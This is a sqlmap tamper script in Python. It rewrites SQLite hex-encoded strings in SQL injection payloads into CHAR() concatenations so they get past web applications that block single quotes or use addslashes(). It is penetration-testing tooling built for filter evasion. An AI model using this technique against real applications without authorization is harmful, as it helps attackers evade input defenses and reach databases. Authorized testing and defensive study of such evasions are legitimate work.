#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.convert import decodeHex
from lib.core.convert import getOrds
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.SQLITE))

def tamper(payload, **kwargs):
    """
    Replaces each (SQLite) CAST(X'4142' AS TEXT) encoded string with equivalent CAST(CHAR(65) AS TEXT) || CAST(CHAR(66) AS TEXT) counterpart
    Requirement:
        * SQLite
    Tested against:
        * SQLite 3
    Notes:
        * Useful in cases when web application block single quotes or use addslashes()
    >>> tamper("SELECT CAST(X'4142' AS TEXT)")
    "SELECT CAST(CHAR(65) AS TEXT) || CAST(CHAR(66) AS TEXT)"
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"CAST\(X'([0-9a-f]+)' AS TEXT\)", retVal):
            result = '||'.join("CAST(CHAR(%d) AS TEXT)" % _ for _ in getOrds(decodeHex(match.group(1))))
            retVal = retVal.replace(match.group(0), result)

    return retVal
